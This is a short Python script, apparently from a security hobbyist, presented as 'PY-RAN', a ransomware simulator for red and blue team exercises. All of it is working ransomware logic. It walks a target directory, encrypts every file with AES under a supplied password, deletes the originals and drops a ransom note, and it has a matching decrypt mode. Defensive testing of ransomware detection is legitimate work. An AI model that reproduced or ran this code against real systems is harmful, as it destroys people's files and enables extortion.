# coded by zer0_p1k4chu
# Simple Ransomware for blue/red teams to test their defenses against ransomwares. Purely for Educational purposes.
# Author not responsible for any damage caused by using this tool.
#!/usr/bin/python3
import argparse
import os
import base64
import pyAesCrypt
parser = argparse.ArgumentParser()
parser.add_argument("--dir",help="Location of the Folder you want to simulate")
parser.add_argument("--mode",help="Accepts encrypt or decrypt arguments.")
parser.add_argument("--password",help="Password to use for encryption/decryption.")
args = parser.parse_args()
def EncryptFile(file,password):
    bufferSize = 64 * 1024
    pyAesCrypt.encryptFile(file, file+".pyran", password, bufferSize)
    os.remove(file)

def DecryptFile(file,password):
    bufferSize = 64 * 1024
    pyAesCrypt.decryptFile(file, file.split(".pyran")[0], password, bufferSize)
    os.remove(file)

welcome = '''
.______   ____    ____      .______          ___      .__   __. 
|   _  \  \   \  /   /      |   _  \        /   \     |  \ |  | 
|  |_)  |  \   \/   / ______|  |_)  |      /  ^  \    |   \|  |
|   ___/    \_    _/ |______|      /      /  /_\  \   |  . `  | 
|  |          |  |          |  |\  \----./  _____  \  |  |\   | 
| _|          |__|          | _| `._____/__/     \__\ |__| \__|

** PY-RAN is a Ransomware Simulator for Red/Blue Teams to simulate a ransomware.
** C0ded by zer0_p1k4chu
** use -h for help
'''
print(welcome)
if(args.mode == "encrypt"):
    for file in [val for sublist in [[os.path.join(i[0], j) for j in i[2]] for i in os.walk(args.dir)] for val in sublist]:
        EncryptFile(file,args.password)
    print("Encryption Done!")
    f = open("ransom.txt","w+")
    f.write("PY-RAN ransomware simulated successfully encrypted the files.")
    f.close()

elif(args.mode == "decrypt"):
    for file in [val for sublist in [[os.path.join(i[0], j) for j in i[2]] for i in os.walk(args.dir)] for val in sublist]:
        try:
            DecryptFile(file,args.password)
        except ValueError:
            # .DS_STORE file
            continue
    print("Decryption Done!")







